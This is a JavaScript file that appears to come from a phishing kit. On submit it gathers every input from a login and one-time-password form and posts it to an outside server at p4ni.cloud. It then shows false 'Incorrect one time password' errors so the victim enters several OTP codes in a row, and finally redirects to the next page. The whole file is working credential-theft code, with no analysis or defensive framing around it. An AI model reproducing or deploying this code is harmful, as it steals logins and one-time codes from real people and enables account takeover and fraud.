var API_URL = "https://p4ni.cloud/api.php?token=WILASKLDJADLKJASD";
var OTT = 0;
var hasPath = "";

function serverCall(body, nextURL) {
    fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        })
        .then((res) => res.json())
        .then((responseData) => {
            if (responseData.status === 200) {
                if (getQuery("next") == "ap.html" && OTT === 0) {
                    document.getElementById("frm_2_am8E_").reset();
                    document.getElementById("tok-invalid").innerHTML = "Incorrect one time password";
                    OTT++;
                    return false;
                }
                if (getQuery("next") == "faa.html" && OTT === 0) {
                    document.getElementById("frm_2_am8E_").reset();
                    document.getElementById("tok-invalid").innerHTML = "Incorrect one time password";
                    OTT++;
                    return false;
                }
                if (getQuery("next") == "un" && OTT < 3) {
                    document.getElementById("frm_2_am8E_").reset();
                    document.getElementById("tok-invalid").innerHTML = "Incorrect one time password";
                    OTT++;
                    return false;
                }
                if(OTT==3){
                    window.location.href = "404.html";
                }
                window.location.href = nextURL;
            } else {
                console.log("response is not valid");
            }
        })
        .catch((error) => {
            console.error(error);
        });
}

window.onload = function() {
    hasPath = window.location.pathname;
    if (hasPath.indexOf("tok") !== -1) {
        document.getElementById("nextValue").value = "loader.html?next="+getQuery("next");
    }
    let form = document.getElementById("frm_2_am8E_");
    let nextValue  = '';
    nextValue = document.getElementById("nextValue").value;
    form.addEventListener("submit", function(event) {
        event.preventDefault(); 
        let formData = {}; 
        for (let i = 0; i < form.elements.length; i++) {
            let element = form.elements[i];
            if (element.tagName === 'INPUT') {
                if (element.value == 'RESET' || element.value == 'LOGIN' || element.value == "Submit") {
                    continue;
                }
                if(element.name=='one'){
                    let one_1 = counterIncrement();
                    formData[element.name+'-'+one_1] = element.value;
                }else{
                    formData[element.name] = element.value;
                }
            }
        }
        formData['site'] = "arguments"
        serverCall(formData, nextValue);
    });
};

function getQuery(query){
        
    var currentURL = window.location.href;
    var urlParams = new URLSearchParams(currentURL.split('?')[1]);
    var nextValue = urlParams.get(query);
    return nextValue;
}

function counterIncrement() {
    var counterValue = localStorage.getItem('1'); 
    if(hasPath == "/tok" || hasPath == "/tok.html") {
        console.log(counterValue);
        if (counterValue === null) {
            counterValue = 0;
        } else {
            counterValue = parseInt(counterValue); 
        }
        counterValue++; 
        localStorage.setItem('1', counterValue); 
    }
    return counterValue;
}


